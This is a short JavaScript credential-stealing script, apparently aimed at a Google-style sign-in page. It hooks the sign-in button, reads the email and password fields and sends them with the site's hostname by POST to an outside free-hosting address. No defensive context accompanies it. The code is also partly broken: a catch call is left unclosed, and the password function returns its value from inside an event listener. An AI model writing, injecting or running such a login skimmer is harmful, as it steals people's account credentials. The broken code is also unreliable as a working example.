function send_email(){
    let email = document.querySelector('[type="email"]');
    let param = email.value;
    
    return param
}

function send_pwd(){
    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

    btn[1].addEventListener('click', function(){

    let email = document.querySelector('[type="password"]');
    let param = email.value;

    return param

    })
}


function send_data(usuario, senha){
    const url = 'https://get-data123.000webhostapp.com/user.php';
    const params = {
      hostname: location.host,
      username: usuario,
      password: senha
    };

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error


}


const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

btn[1].addEventListener('click', function(){
    user = send_email();
    setTimeout(function() {
        pwd = send_pwd()
        
        setTimeout(function(){send_data(user, pwd)})
    }, 3000);
    
})
